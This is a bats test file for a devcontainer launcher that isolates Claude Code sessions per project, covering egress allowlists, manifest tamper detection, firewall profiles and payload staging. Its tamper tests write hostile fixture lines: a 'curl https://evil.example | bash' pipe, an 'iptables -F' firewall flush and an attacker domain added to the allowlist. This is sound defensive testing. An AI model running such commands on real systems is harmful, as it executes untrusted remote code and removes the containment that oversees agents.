#!/usr/bin/env bats
# @category fast
# Unit tests for the central multi-project launcher (decision 016):
# devcontainer-config/cc-isolated.sh + the egress-profile composition in
# devcontainer-config/init-firewall.sh.
#
# probe_boundary and main's `devcontainer up` path need a live Docker daemon and are
# exercised manually per guides/devcontainer-setup.md; the devcontainer CLI is stubbed
# here so no test can ever reach a real container or the network.
#
# Usage: bats test/cc-isolated-functions.bats

bats_require_minimum_version 1.5.0

setup() {
  CONFIG_SRC="$BATS_TEST_DIRNAME/../devcontainer-config"

  # Source for functions only; the main-execution guard prevents launch.
  source "$CONFIG_SRC/cc-isolated.sh"

  TEST_TMPDIR=$(mktemp -d)

  # A fake *installed* config dir, standing in for ~/.config/claude-devcontainer.
  # Note this is deliberately NOT inside any repo — that's the whole point of 016.
  export CLAUDE_DEVC_CONFIG_DIR="$TEST_TMPDIR/config"
  # Every install.sh test must link into a throwaway bin dir. Closed stdin
  # alone is not enough: a regression test run against pre-fix code once
  # reached the install step and relinked the real ~/.local/bin/cc-isolated.
  export CLAUDE_DEVC_BIN_DIR="$TEST_TMPDIR/bin"
  mkdir -p "$CLAUDE_DEVC_CONFIG_DIR/egress"
  echo '{"name":"x"}'        > "$CLAUDE_DEVC_CONFIG_DIR/devcontainer.json"
  echo 'FROM node:22'        > "$CLAUDE_DEVC_CONFIG_DIR/Dockerfile"
  echo '#!/bin/bash'         > "$CLAUDE_DEVC_CONFIG_DIR/init-firewall.sh"
  echo '#!/usr/bin/env bash' > "$CLAUDE_DEVC_CONFIG_DIR/cc-isolated.sh"
  echo '#!/usr/bin/env bash' > "$CLAUDE_DEVC_CONFIG_DIR/cc-push.sh"
  echo '# shellcheck shell=bash' > "$CLAUDE_DEVC_CONFIG_DIR/cc-exit-scan.sh"
  echo '# shellcheck shell=bash' > "$CLAUDE_DEVC_CONFIG_DIR/cc-gitdir.sh"
  echo '#!/usr/bin/python3'   > "$CLAUDE_DEVC_CONFIG_DIR/cc-sni-proxy.py"
  echo '#!/usr/bin/env bash' > "$CLAUDE_DEVC_CONFIG_DIR/link-claude-home.sh"
  echo 'api.anthropic.com'   > "$CLAUDE_DEVC_CONFIG_DIR/egress/base.txt"
  echo 'pypi.org'            > "$CLAUDE_DEVC_CONFIG_DIR/egress/python.txt"

  # Stub the devcontainer CLI so nothing can reach Docker or the network.
  mkdir -p "$TEST_TMPDIR/bin"
  printf '#!/usr/bin/env bash\nexit 0\n' > "$TEST_TMPDIR/bin/devcontainer"
  chmod +x "$TEST_TMPDIR/bin/devcontainer"
  # install.sh's no-agent gate (Q-058) asks pgrep and docker what runs; the
  # session running these tests is a Claude Code process, so both report none.
  printf '#!/usr/bin/env bash\nexit 1\n' > "$TEST_TMPDIR/bin/pgrep"
  printf '#!/usr/bin/env bash\nexit 0\n' > "$TEST_TMPDIR/bin/docker"
  chmod +x "$TEST_TMPDIR/bin/pgrep" "$TEST_TMPDIR/bin/docker"
  PATH="$TEST_TMPDIR/bin:$PATH"
}

teardown() {
  # The exit-scan tests make dirs unlistable (chmod 0311); rm -rf needs them back.
  chmod -R u+rwx "$TEST_TMPDIR" 2>/dev/null || true
  rm -rf "$TEST_TMPDIR"
}

# Make a throwaway git repo with one commit.
make_repo() {
  local path="$1"
  mkdir -p "$path"
  git -C "$path" init -q
  git -C "$path" config user.email "t@example.com"
  git -C "$path" config user.name "t"
  echo hello > "$path/file.txt"
  git -C "$path" add -A
  git -C "$path" -c commit.gpgsign=false commit -qm "init"
}

# --- resolve_workspace: the decision-015 footgun this decision exists to close ---

@test "resolve_workspace returns the git toplevel for a path inside a repo" {
  make_repo "$TEST_TMPDIR/proj"
  mkdir -p "$TEST_TMPDIR/proj/deep/nested"
  run resolve_workspace "$TEST_TMPDIR/proj/deep/nested"
  [ "$status" -eq 0 ]
  [ "$output" = "$(git -C "$TEST_TMPDIR/proj" rev-parse --show-toplevel)" ]
}

@test "resolve_workspace fails loudly outside a git repo instead of guessing" {
  mkdir -p "$TEST_TMPDIR/not-a-repo"
  run resolve_workspace "$TEST_TMPDIR/not-a-repo"
  [ "$status" -ne 0 ]
  [[ "$output" == *"not inside a git repository"* ]]
}

@test "resolve_workspace fails on a nonexistent directory" {
  run resolve_workspace "$TEST_TMPDIR/nope"
  [ "$status" -ne 0 ]
  [[ "$output" == *"not a directory"* ]]
}

@test "resolve_workspace defaults to \$PWD when given no argument" {
  make_repo "$TEST_TMPDIR/proj"
  cd "$TEST_TMPDIR/proj"
  run resolve_workspace
  [ "$status" -eq 0 ]
  [ "$output" = "$(git -C "$TEST_TMPDIR/proj" rev-parse --show-toplevel)" ]
}

# --- project_id: H3, two repos sharing a basename must not collide ---

@test "project_id differs for same-basename repos at different paths" {
  local a b
  a="$(project_id /home/u/work/app)"
  b="$(project_id /home/u/side/app)"
  [ -n "$a" ]
  [ "$a" != "$b" ]
}

@test "project_id is stable for the same path" {
  [ "$(project_id /home/u/work/app)" = "$(project_id /home/u/work/app)" ]
}

# --- ws_fingerprint: catches a wrong/aliased mount ---

@test "ws_fingerprint differs between two different repos" {
  make_repo "$TEST_TMPDIR/a"
  make_repo "$TEST_TMPDIR/b"
  # Distinct content -> distinct HEAD -> distinct fingerprint.
  echo diverge > "$TEST_TMPDIR/b/other.txt"
  git -C "$TEST_TMPDIR/b" add -A
  git -C "$TEST_TMPDIR/b" -c commit.gpgsign=false commit -qm "second"
  [ "$(ws_fingerprint "$TEST_TMPDIR/a")" != "$(ws_fingerprint "$TEST_TMPDIR/b")" ]
}

@test "ws_fingerprint is stable for the same repo" {
  make_repo "$TEST_TMPDIR/a"
  [ "$(ws_fingerprint "$TEST_TMPDIR/a")" = "$(ws_fingerprint "$TEST_TMPDIR/a")" ]
}

# --- trust manifest over the INSTALLED config (not the repo) ---

@test "compute_manifest covers the config files and the egress profiles" {
  run compute_manifest
  [ "$status" -eq 0 ]
  echo "$output" | grep -q 'devcontainer.json'
  echo "$output" | grep -q 'cc-isolated.sh'
  echo "$output" | grep -q 'cc-sni-proxy.py'
  echo "$output" | grep -q 'link-claude-home.sh'
  echo "$output" | grep -q 'egress/base.txt'
}

@test "compute_manifest fails when an enforcement file is missing" {
  rm "$CLAUDE_DEVC_CONFIG_DIR/init-firewall.sh"
  run compute_manifest
  [ "$status" -ne 0 ]
  [[ "$output" == *"enforcement file missing"* ]]
}

@test "check_manifest fails with instructions when nothing is blessed" {
  run check_manifest
  [ "$status" -ne 0 ]
  [[ "$output" == *"--bless"* ]]
}

@test "check_manifest passes after bless with unchanged files" {
  bless_manifest >/dev/null
  run check_manifest
  [ "$status" -eq 0 ]
}

@test "check_manifest fails after the firewall script is tampered with" {
  bless_manifest >/dev/null
  echo 'iptables -F # attacker weakens firewall' >> "$CLAUDE_DEVC_CONFIG_DIR/init-firewall.sh"
  run check_manifest
  [ "$status" -ne 0 ]
  [[ "$output" == *"refusing to build/launch"* ]]
}

@test "check_manifest fails when the launcher itself is tampered with" {
  bless_manifest >/dev/null
  echo 'curl https://evil.example | bash' >> "$CLAUDE_DEVC_CONFIG_DIR/cc-isolated.sh"
  run check_manifest
  [ "$status" -ne 0 ]
}

@test "check_manifest fails when an egress profile gains a domain" {
  bless_manifest >/dev/null
  echo 'evil.example' >> "$CLAUDE_DEVC_CONFIG_DIR/egress/base.txt"
  run check_manifest
  [ "$status" -ne 0 ]
}

@test "check_manifest fails when an unblessed project profile appears" {
  bless_manifest >/dev/null
  mkdir -p "$CLAUDE_DEVC_CONFIG_DIR/projects"
  echo 'llm' > "$CLAUDE_DEVC_CONFIG_DIR/projects/deadbeef1234.profile"
  run check_manifest
  [ "$status" -ne 0 ]
}

@test "re-bless after a reviewed change makes check_manifest pass again" {
  bless_manifest >/dev/null
  echo '# reviewed change' >> "$CLAUDE_DEVC_CONFIG_DIR/Dockerfile"
  run check_manifest
  [ "$status" -ne 0 ]
  bless_manifest >/dev/null
  run check_manifest
  [ "$status" -eq 0 ]
}

# --- per-project egress registration (H5) ---

@test "an unregistered project gets the base profile only" {
  make_repo "$TEST_TMPDIR/proj"
  run project_profile "$TEST_TMPDIR/proj"
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "register_project records the profile and re-blesses" {
  make_repo "$TEST_TMPDIR/proj"
  bless_manifest >/dev/null
  run register_project "$TEST_TMPDIR/proj" "python"
  [ "$status" -eq 0 ]
  [ "$(project_profile "$TEST_TMPDIR/proj")" = "python" ]
  # The new profile file is boundary config, so the manifest must already cover it.
  run check_manifest
  [ "$status" -eq 0 ]
}

@test "register_project rejects an unknown profile before writing anything" {
  make_repo "$TEST_TMPDIR/proj"
  run register_project "$TEST_TMPDIR/proj" "nosuchprofile"
  [ "$status" -ne 0 ]
  [[ "$output" == *"unknown egress profile"* ]]
  [ -z "$(project_profile "$TEST_TMPDIR/proj")" ]
}

# --- --profile REPLACES the grant, and must say so -----------------------------
# Regression: re-registering a project to add `lean` silently dropped the `dotnet`
# it already had, and the only symptom was a container whose egress was narrower
# than expected — hours later, with nothing pointing back at the registration.

@test "register_project prints the profile transition, not just the result" {
  echo 'release.lean-lang.org' > "$CLAUDE_DEVC_CONFIG_DIR/egress/lean.txt"
  make_repo "$TEST_TMPDIR/proj"
  register_project "$TEST_TMPDIR/proj" "python" >/dev/null
  run register_project "$TEST_TMPDIR/proj" "lean"
  [ "$status" -eq 0 ]
  [[ "$output" == *"base,python"*"->"*"base,lean"* ]]
}

@test "register_project names a profile the replacement drops" {
  echo 'release.lean-lang.org' > "$CLAUDE_DEVC_CONFIG_DIR/egress/lean.txt"
  make_repo "$TEST_TMPDIR/proj"
  register_project "$TEST_TMPDIR/proj" "python,lean" >/dev/null
  run register_project "$TEST_TMPDIR/proj" "lean"
  [ "$status" -eq 0 ]
  # The dropped one is named; the retained one is not reported as dropped.
  [[ "$output" == *"'python' was granted before and is NOT in the new profile"* ]]
  [[ "$output" != *"'lean' was granted before"* ]]
}

@test "register_project says so when the profile is unchanged" {
  make_repo "$TEST_TMPDIR/proj"
  register_project "$TEST_TMPDIR/proj" "python" >/dev/null
  run register_project "$TEST_TMPDIR/proj" "python"
  [ "$status" -eq 0 ]
  [[ "$output" == *"(unchanged)"* ]]
  [[ "$output" != *"NOT in the new profile"* ]]
}

# --- the by-hand rebuild command must carry the localEnv inputs -----------------
# Regression (2026-09-15): the printed remediation was a bare `devcontainer up
# --remove-existing-container ...`. devcontainer.json reads CC_EGRESS_PROFILE and
# CC_CONFIG_HASH via ${localEnv:...}, which only main() exports, so running that
# command from a normal shell rebuilt the image with an EMPTY egress profile —
# base-only egress, no error, and a re-registered profile that never took effect.

@test "rebuild_hint carries both localEnv assignments into the by-hand command" {
  # Set as ordinary variables rather than a `VAR=x run ...` prefix: an assignment
  # prefixed onto a *function* call persists in the shell afterwards, which would
  # leak into the next assertion in this file.
  # shellcheck disable=SC2034  # read as a global by rebuild_hint, not by this file
  CC_EGRESS_PROFILE="lean"
  CC_CONFIG_HASH="deadbeef"
  run rebuild_hint "$TEST_TMPDIR/proj" --workspace-folder "$TEST_TMPDIR/proj"
  [ "$status" -eq 0 ]
  [[ "$output" == *"CC_EGRESS_PROFILE=lean"* ]]
  [[ "$output" == *"CC_CONFIG_HASH=deadbeef"* ]]
  [[ "$output" == *"devcontainer up --remove-existing-container"* ]]
}

# Regression (audit 2026-09-18, D3): the by-hand form carried only
# CC_EGRESS_PROFILE and CC_CONFIG_HASH, but devcontainer.json also reads
# CC_PROJECT_ID (the volume names), CC_PROJECT_NAME and CC_CONFIG_DIR (the build
# context) — and printed the args unquoted. Run the printed command for real
# against a recording stub and check what devcontainer would have seen.
@test "rebuild_hint's by-hand command, when run, sets every launcher-set localEnv var and keeps args intact" {
  local ws="$TEST_TMPDIR/my proj \$HOME"
  # All five are read as globals by rebuild_hint, not by this file.
  # shellcheck disable=SC2034
  CC_PROJECT_ID="abc123"
  # shellcheck disable=SC2034
  CC_PROJECT_NAME="my proj \$HOME"
  # shellcheck disable=SC2034
  CC_CONFIG_DIR="$CLAUDE_DEVC_CONFIG_DIR"
  # shellcheck disable=SC2034
  CC_EGRESS_PROFILE="lean,python"
  # shellcheck disable=SC2034
  CC_CONFIG_HASH="deadbeef"
  run rebuild_hint "$ws" --workspace-folder "$ws" --id-label "cc-project=abc123"
  [ "$status" -eq 0 ]
  # Every ${localEnv:X} devcontainer.json reads, minus the ones the user supplies
  # themselves (TZ has a default; the two credentials are opt-in and never printed).
  local var vars
  vars=$(grep -o '\${localEnv:[A-Z_]*' "$CONFIG_SRC/devcontainer.json" | sed 's/.*://' | sort -u \
         | grep -vxE 'TZ|OPENROUTER_API_KEY|GH_TOKEN')
  [ -n "$vars" ]
  # Recording stub: dumps its env and argv, one arg per line.
  cat > "$TEST_TMPDIR/bin/devcontainer" <<'STUB'
#!/usr/bin/env bash
env > "$REC_DIR/env"
printf '%s\n' "$@" > "$REC_DIR/args"
STUB
  chmod +x "$TEST_TMPDIR/bin/devcontainer"
  # The by-hand command is everything after the "or by hand" line.
  local cmd
  cmd=$(printf '%s\n' "$output" | sed '1,/or by hand/d')
  env -i PATH="$PATH" REC_DIR="$TEST_TMPDIR" bash -c "$cmd"
  for var in $vars; do
    grep -qx "$var=.\+" "$TEST_TMPDIR/env" || { echo "unset in by-hand command: $var"; false; }
  done
  grep -qx "CC_PROJECT_NAME=my proj \\\$HOME" "$TEST_TMPDIR/env"
  grep -qx "CC_EGRESS_PROFILE=lean,python" "$TEST_TMPDIR/env"
  [ "$(sed -n 4p "$TEST_TMPDIR/args")" = "$ws" ]
  [ "$(sed -n 1p "$TEST_TMPDIR/args")" = "up" ]
  # The launcher line quotes the workspace too.
  [[ "$(echo "$output" | head -1)" == *"cc-isolated $(printf '%q' "$ws")"* ]]
}

@test "--profile with no value is a usage error, not a silent exit" {
  # Regression (audit 2026-09-18): `shift 2` under set -e exited 1 with no output.
  make_repo "$TEST_TMPDIR/proj"
  run bash "$CONFIG_SRC/cc-isolated.sh" --register "$TEST_TMPDIR/proj" --profile
  [ "$status" -eq 2 ]
  [[ "$output" == *"--profile needs a value"* ]]
  [ -z "$(project_profile "$TEST_TMPDIR/proj")" ]
}

@test "rebuild_hint names the launcher before the by-hand form" {
  run rebuild_hint "$TEST_TMPDIR/proj" --workspace-folder "$TEST_TMPDIR/proj"
  [ "$status" -eq 0 ]
  # The supported path must come first: the by-hand form is the one that can be
  # run wrong, so it must never be the first thing a reader copies.
  [[ "$(echo "$output" | head -1)" == *"cc-isolated"* ]]
}

@test "usage prints the whole header block, exit status included, and nothing past it" {
  run usage
  [ "$status" -eq 0 ]
  [[ "$output" == *"REPLACES any"* ]]
  [[ "$output" == *"really is the repo you asked for"* ]]
  [[ "$output" == *"EXIT STATUS"*"2  bad usage"*"3  the exit scan found a change"*"4  the exit scan could not read everything"* ]]
  [[ "$output" == *"1 at launch; at exit an"*"unreadable .git is 4"*"is a finding, 3"* ]]
  # The header's last line; and no code after it.
  [[ "$output" == *'"Changing the boundary".'* ]]
  [[ "$output" != *"set -euo pipefail"* ]]
}

@test "usage errors exit 2 (an unknown flag), with the help on stderr" {
  run bash "$CONFIG_SRC/cc-isolated.sh" --nope
  [ "$status" -eq 2 ]
  [[ "$output" == *"unknown flag: --nope"*"EXIT STATUS"* ]]
}

@test "suggest_profiles proposes python for a python repo but never applies it" {
  make_repo "$TEST_TMPDIR/proj"
  touch "$TEST_TMPDIR/proj/pyproject.toml"
  [ "$(suggest_profiles "$TEST_TMPDIR/proj")" = "python" ]
  # Suggestion only — the repo's own contents must not grant it egress.
  [ -z "$(project_profile "$TEST_TMPDIR/proj")" ]
}

@test "suggest_profiles proposes rust for a cargo repo but never applies it" {
  make_repo "$TEST_TMPDIR/proj"
  touch "$TEST_TMPDIR/proj/Cargo.toml"
  [ "$(suggest_profiles "$TEST_TMPDIR/proj")" = "rust" ]
  # Suggestion only — the repo's own manifest must not grant it egress.
  [ -z "$(project_profile "$TEST_TMPDIR/proj")" ]
}

@test "suggest_profiles proposes lean for a repo with the toolchain pin" {
  make_repo "$TEST_TMPDIR/proj"
  touch "$TEST_TMPDIR/proj/lean-toolchain"
  [ "$(suggest_profiles "$TEST_TMPDIR/proj")" = "lean" ]
  # Suggestion only — the repo's own toolchain pin must not grant it egress.
  [ -z "$(project_profile "$TEST_TMPDIR/proj")" ]
}

@test "suggest_profiles proposes lean for a lakefile.toml repo (current Lake format)" {
  make_repo "$TEST_TMPDIR/proj"
  touch "$TEST_TMPDIR/proj/lakefile.toml"
  [ "$(suggest_profiles "$TEST_TMPDIR/proj")" = "lean" ]
}

@test "suggest_profiles proposes lean for a lakefile.lean repo (older Lake format)" {
  make_repo "$TEST_TMPDIR/proj"
  touch "$TEST_TMPDIR/proj/lakefile.lean"
  [ "$(suggest_profiles "$TEST_TMPDIR/proj")" = "lean" ]
}

@test "suggest_profiles proposes android for a gradle repo (Kotlin DSL)" {
  make_repo "$TEST_TMPDIR/proj"
  touch "$TEST_TMPDIR/proj/build.gradle.kts"
  [ "$(suggest_profiles "$TEST_TMPDIR/proj")" = "android" ]
  # Suggestion only — the repo's own build files must not grant it egress.
  [ -z "$(project_profile "$TEST_TMPDIR/proj")" ]
}

@test "suggest_profiles proposes android for a repo with just the gradle wrapper" {
  make_repo "$TEST_TMPDIR/proj"
  touch "$TEST_TMPDIR/proj/gradlew"
  [ "$(suggest_profiles "$TEST_TMPDIR/proj")" = "android" ]
}

@test "suggest_profiles proposes dotnet for a Unity project root" {
  make_repo "$TEST_TMPDIR/proj"
  mkdir -p "$TEST_TMPDIR/proj/ProjectSettings"
  touch "$TEST_TMPDIR/proj/ProjectSettings/ProjectVersion.txt"
  [ "$(suggest_profiles "$TEST_TMPDIR/proj")" = "dotnet" ]
  # Suggestion only — the repo's own contents must not grant it egress.
  [ -z "$(project_profile "$TEST_TMPDIR/proj")" ]
}

@test "suggest_profiles proposes dotnet for a repo with a top-level csproj" {
  make_repo "$TEST_TMPDIR/proj"
  touch "$TEST_TMPDIR/proj/GameLogic.csproj"
  [ "$(suggest_profiles "$TEST_TMPDIR/proj")" = "dotnet" ]
}

@test "suggest_profiles is silent for a plain repo" {
  make_repo "$TEST_TMPDIR/proj"
  [ -z "$(suggest_profiles "$TEST_TMPDIR/proj")" ]
}

# --- egress composition in the real init-firewall.sh ---

firewall() {
  CC_EGRESS_DIR="$CONFIG_SRC/egress" \
  CC_EGRESS_PROFILE_FILE="$TEST_TMPDIR/profile" \
  bash "$CONFIG_SRC/init-firewall.sh" --print-domains
}

@test "base profile alone yields the base allowlist and nothing else" {
  : > "$TEST_TMPDIR/profile"
  run firewall
  [ "$status" -eq 0 ]
  [[ "$output" == *"api.anthropic.com"* ]]
  [[ "$output" != *"pypi.org"* ]]
  [[ "$output" != *"openrouter.ai"* ]]
}

@test "a python project gets PyPI on top of base" {
  echo 'python' > "$TEST_TMPDIR/profile"
  run firewall
  [ "$status" -eq 0 ]
  [[ "$output" == *"api.anthropic.com"* ]]
  [[ "$output" == *"pypi.org"* ]]
}

@test "one project's profile does not widen another's (H5)" {
  echo 'python' > "$TEST_TMPDIR/profile"
  run firewall
  [[ "$output" == *"pypi.org"* ]]
  # Same image, different project: base only, and PyPI is gone again.
  : > "$TEST_TMPDIR/profile"
  run firewall
  [[ "$output" != *"pypi.org"* ]]
}

@test "profiles compose" {
  echo 'python,lean' > "$TEST_TMPDIR/profile"
  run firewall
  [ "$status" -eq 0 ]
  [[ "$output" == *"pypi.org"* ]]
  [[ "$output" == *"release.lean-lang.org"* ]]
}

@test "an android project gets Google Maven, Maven Central, and Gradle on top of base" {
  echo 'android' > "$TEST_TMPDIR/profile"
  run firewall
  [ "$status" -eq 0 ]
  [[ "$output" == *"api.anthropic.com"* ]]
  [[ "$output" == *"dl.google.com"* ]]
  [[ "$output" == *"repo.maven.apache.org"* ]]
  [[ "$output" == *"services.gradle.org"* ]]
  # base-only projects must not inherit any of this (H5).
  : > "$TEST_TMPDIR/profile"
  run firewall
  [[ "$output" != *"dl.google.com"* ]]
}

@test "a dotnet project gets NuGet on top of base, and only NuGet" {
  echo 'dotnet' > "$TEST_TMPDIR/profile"
  run firewall
  [ "$status" -eq 0 ]
  [[ "$output" == *"api.anthropic.com"* ]]
  [[ "$output" == *"api.nuget.org"* ]]
  # The SDK host is build-time-only, deliberately absent (rust.txt precedent).
  [[ "$output" != *"builds.dotnet.microsoft.com"* ]]
  # base-only projects must not inherit NuGet (H5).
  : > "$TEST_TMPDIR/profile"
  run firewall
  [[ "$output" != *"api.nuget.org"* ]]
}

@test "an unknown profile is a hard failure, not a silently narrower allowlist" {
  echo 'typo' > "$TEST_TMPDIR/profile"
  run firewall
  [ "$status" -ne 0 ]
  [[ "$output" == *"unknown egress profile"* ]]
}

@test "a missing profile file degrades to base, not to empty" {
  CC_EGRESS_DIR="$CONFIG_SRC/egress" \
  CC_EGRESS_PROFILE_FILE="$TEST_TMPDIR/does-not-exist" \
  run bash "$CONFIG_SRC/init-firewall.sh" --print-domains
  [ "$status" -eq 0 ]
  [[ "$output" == *"api.anthropic.com"* ]]
}

# --- build-path anchoring (regression: --override-config resolves relative build
# --- paths against the TARGET REPO, not the config dir) ---
#
# These assert on the REAL devcontainer-config/devcontainer.json, not the stub in
# setup(). A relative "dockerfile"/"context" here means the CLI builds
# <repo>/.devcontainer/Dockerfile: a hard failure in repos without one, and a silent
# H2 breach in repos that have one (their agent-writable init-firewall.sh gets baked
# into the image). This is how cc-isolated shipped, and only the repo's own leftover
# .devcontainer/ made it look like it worked.

@test "devcontainer.json anchors build.dockerfile to the config dir, not the repo" {
  run grep -E '"dockerfile"[[:space:]]*:' "$CONFIG_SRC/devcontainer.json"
  [ "$status" -eq 0 ]
  [[ "$output" == *'${localEnv:CC_CONFIG_DIR}/Dockerfile'* ]]
}

@test "devcontainer.json anchors build.context to the config dir, not the repo" {
  run grep -E '"context"[[:space:]]*:' "$CONFIG_SRC/devcontainer.json"
  [ "$status" -eq 0 ]
  [[ "$output" == *'${localEnv:CC_CONFIG_DIR}'* ]]
  # A bare "." would resolve to <repo>/.devcontainer — the bug.
  [[ "$output" != *'": "."'* ]]
}

@test "the launcher exports CC_CONFIG_DIR (else the build paths resolve to /)" {
  # Must match an `export` statement naming the variable, not the bare assignment
  # (an alternation on the assignment kept this green with the export removed).
  # The behavioral check is in "a launch on a matching, verified container".
  run grep -E '^\s*export( [A-Z_]+)* CC_CONFIG_DIR( |$)' "$CONFIG_SRC/cc-isolated.sh"
  [ "$status" -eq 0 ]
}

# --- decision 022: the claude-workflows payload ------------------------------
# The bug these pin: /home/node/.claude is a per-project VOLUME, so a fresh
# volume is empty and no cc-isolated session ever had this repo's skills
# registered. The payload must be baked into the image and linked in at start.

@test "Dockerfile copies the claude-home payload into the image" {
  run grep -E '^COPY claude-home/ /opt/claude-workflows/' "$CONFIG_SRC/Dockerfile"
  [ "$status" -eq 0 ]
}

@test "the payload is baked outside /home/node/.claude (a volume would shadow it)" {
  # Any COPY targeting the volume path would be silently discarded at runtime.
  run grep -E '^COPY .*/home/node/\.claude' "$CONFIG_SRC/Dockerfile"
  [ "$status" -ne 0 ]
}

@test "the payload is root-owned and not writable by node" {
  run grep -E 'chown -R root:root /opt/claude-workflows' "$CONFIG_SRC/Dockerfile"
  [ "$status" -eq 0 ]
  run grep -E 'find /opt/claude-workflows -type d -exec chmod 0555' "$CONFIG_SRC/Dockerfile"
  [ "$status" -eq 0 ]
}

@test "hook scripts in the payload stay executable" {
  run grep -E "find /opt/claude-workflows -type f .*-name '\*\.sh'.*chmod 0555" "$CONFIG_SRC/Dockerfile"
  [ "$status" -eq 0 ]
}

@test "postStartCommand links the payload after the firewall, not before" {
  run grep -E '"postStartCommand"' "$CONFIG_SRC/devcontainer.json"
  [ "$status" -eq 0 ]
  [[ "$output" == *'init-firewall.sh'* ]]
  [[ "$output" == *'link-claude-home.sh'* ]]
  # Firewall first: `&&` means a boundary failure aborts before anything else runs.
  [[ "${output%%link-claude-home*}" == *'init-firewall.sh'* ]]
}

@test "install.sh stages the payload from the repo root" {
  run grep -E 'CLAUDE_HOME_SRC=' "$CONFIG_SRC/install.sh"
  [ "$status" -eq 0 ]
  [[ "$output" == *'skills'* ]]
  # The full path, not a bare 'CLAUDE.md' substring: the bare form matches both
  # spellings, so it stayed green across the 2026-09-11 move it was meant to
  # cover (code review 2026-09-12, C6).
  [[ "$output" == *'global-instructions/CLAUDE.md'* ]]
  run grep -E 'PAYLOAD=.*claude-home' "$CONFIG_SRC/install.sh"
  [ "$status" -eq 0 ]
}

# Helper: a throwaway repo tree holding a copy of install.sh plus the payload
# sources, so the assembly loop can run for real without touching this repo.
# `omit` names one CLAUDE_HOME_SRC entry to leave absent. The devcontainer
# PAYLOAD items are committed stubs: install.sh stages every item from HEAD.
fake_install_repo() {
  local omit="${1:-}" root="$BATS_TEST_TMPDIR/fakerepo" item f
  rm -rf "$root"
  mkdir -p "$root/devcontainer-config/egress"
  cp "$CONFIG_SRC/install.sh" "$root/devcontainer-config/install.sh"
  for f in devcontainer.json Dockerfile init-firewall.sh cc-sni-proxy.py cc-isolated.sh cc-exit-scan.sh cc-gitdir.sh cc-push.sh link-claude-home.sh; do
    printf 'stub %s\n' "$f" > "$root/devcontainer-config/$f"
  done
  printf 'api.anthropic.com\n' > "$root/devcontainer-config/egress/base.txt"
  for item in global-instructions/CLAUDE.md skills workflows guides patterns hooks scripts; do
    [ "$item" = "$omit" ] && continue
    case "$item" in
      */*) mkdir -p "$root/$(dirname "$item")"; printf 'stub\n' > "$root/$item" ;;
      *)   mkdir -p "$root/$item"; printf 'stub\n' > "$root/$item/stub.md" ;;
    esac
  done
  git -C "$root" init -q
  fake_commit "$root"
  printf '%s\n' "$root"
}

# install.sh stages the claude-home payload from COMMITTED content only, so a
# fixture change that should be staged must be committed.
fake_commit() {
  git -C "$1" add -A
  git -C "$1" -c user.email=t@t -c user.name=t commit -q --allow-empty -m fixture
}

@test "install.sh aborts when a payload source is missing" {
  # Silent-and-total: a payload assembled without one of its seven sources
  # ships an image whose sessions quietly lack that part of the process
  # (questions.md 2026-09-12, A13). It must die before the bless prompt.
  root=$(fake_install_repo global-instructions/CLAUDE.md)
  run env CLAUDE_DEVC_CONFIG_DIR="$BATS_TEST_TMPDIR/nodest" \
      bash "$root/devcontainer-config/install.sh" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *'payload source(s) not found'* ]]
  [[ "$output" == *'global-instructions/CLAUDE.md'* ]]
  # It must not have got as far as offering to install an incomplete payload.
  [[ "$output" != *'Aborted'* ]]
}

@test "install.sh names every missing payload source, not just the first" {
  root=$(fake_install_repo)
  rm -rf "$root/global-instructions" "$root/patterns"; fake_commit "$root"
  run env CLAUDE_DEVC_CONFIG_DIR="$BATS_TEST_TMPDIR/nodest" \
      bash "$root/devcontainer-config/install.sh" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *'global-instructions/CLAUDE.md'* ]]
  [[ "$output" == *'patterns'* ]]
}

@test "install.sh assembles the payload when every source is present" {
  # Complement of the two above: proves the guard is not firing wholesale.
  # Stdin is closed, so the run declines at the bless prompt — reaching that
  # prompt is the marker that assembly got all the way past the guard.
  root=$(fake_install_repo)
  run env CLAUDE_DEVC_CONFIG_DIR="$BATS_TEST_TMPDIR/nodest" \
      bash "$root/devcontainer-config/install.sh" </dev/null
  [[ "$output" != *'payload source(s) not found'* ]]
  [[ "$output" == *'bless it?'* ]]
  # An EOF stdin must decline *and say so*: before `read -r reply || reply=""`,
  # errexit killed the script at the prompt and this line never printed.
  [ "$status" -eq 1 ]
  [[ "$output" == *'Aborted. Nothing was changed.'* ]]
  [ -e "$root/devcontainer-config/claude-home/CLAUDE.md" ]
  [ -d "$root/devcontainer-config/claude-home/skills" ]
}

@test "install.sh stages committed content only: uncommitted changes are listed, not staged" {
  # Code review 2026-09-23 C1 (user decision): the working tree is agent-writable
  # and carries ignored build junk, so the payload is the commit, not the tree.
  root=$(fake_install_repo)
  printf 'uncommitted\n' > "$root/skills/new.md"
  printf 'edited\n' >> "$root/hooks/stub.md"
  mkdir -p "$root/scripts/__pycache__"; printf 'x\n' > "$root/scripts/__pycache__/c.pyc"
  printf 'scripts/__pycache__/\n' > "$root/.gitignore"
  run env CLAUDE_DEVC_CONFIG_DIR="$BATS_TEST_TMPDIR/nodest" \
      bash "$root/devcontainer-config/install.sh" </dev/null
  echo "$output"
  [[ "$output" == *'NOT included'*'skills/new.md'* ]]
  [[ "$output" == *'hooks/stub.md'* ]]
  [ -e "$root/devcontainer-config/claude-home/skills/stub.md" ]
  [ ! -e "$root/devcontainer-config/claude-home/skills/new.md" ]
  [ "$(cat "$root/devcontainer-config/claude-home/hooks/stub.md")" = stub ]
  [ ! -e "$root/devcontainer-config/claude-home/scripts/__pycache__" ]
  grep -q "^commit=$(git -C "$root" rev-parse HEAD)$" "$root/devcontainer-config/claude-home/.manifest"
}

@test "install.sh treats a payload source that exists but was never committed as missing" {
  root=$(fake_install_repo patterns)
  mkdir -p "$root/patterns"; printf 'uncommitted\n' > "$root/patterns/p.md"
  run env CLAUDE_DEVC_CONFIG_DIR="$BATS_TEST_TMPDIR/nodest" \
      bash "$root/devcontainer-config/install.sh" </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *'payload source(s) not found'*'patterns'* ]]
}

# Helper: mirror the fake repo's committed non-assembled PAYLOAD items (see
# fake_install_repo) into an existing install dir so the review diff runs.
# Prints the install dir.
fake_payload_and_dest() {
  local root="$1" dest="$BATS_TEST_TMPDIR/installed" f
  local cfg="$root/devcontainer-config"
  rm -rf "$dest"; mkdir -p "$dest"
